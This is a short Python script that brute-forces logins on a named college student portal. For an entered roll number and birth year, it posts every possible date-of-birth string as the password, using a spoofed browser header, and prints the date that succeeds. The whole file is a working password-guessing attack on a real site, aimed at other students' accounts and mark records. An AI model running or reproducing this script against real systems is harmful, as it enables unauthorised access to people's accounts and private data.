# -*- coding: utf-8 -*-
"""
Created on Wed Dec  6 12:27:58 2017

@author: Vigneshwaran
"""

import sys
import requests
"""import selenium
from selenium import webdriver
from selenium.webdriver.common.keys import keys """
from bs4 import BeautifulSoup as BS

h = {
		
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36'
	}

url="http://students.psgitech.ac.in"

def connect(url, m):
	t = requests.post(url, data = m, headers = h)
	soup = BS(t.text, 'html5lib')
	if "Mark" in soup:
		print("DOB : " + m["TxtPasswd"])
		sys.exit()

def controller():
	m = {}
	roll = str(input("Roll No: "))
	year = str(input("Year: "))
	MON=['JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC']
	for i in range(1,13):
		for j in range(1,32):
			m["TxtStudID"] = roll
			m["TxtPasswd"] = str(j).zfill(2)+ MON[i-1] + year
			m["BtnLogin"] = "Login"
			print ("Checking for " + m["TxtPasswd"])
			connect(url ,m)
	print (":( DOB not found!")
	print ("?! Try Another Year")

controller()
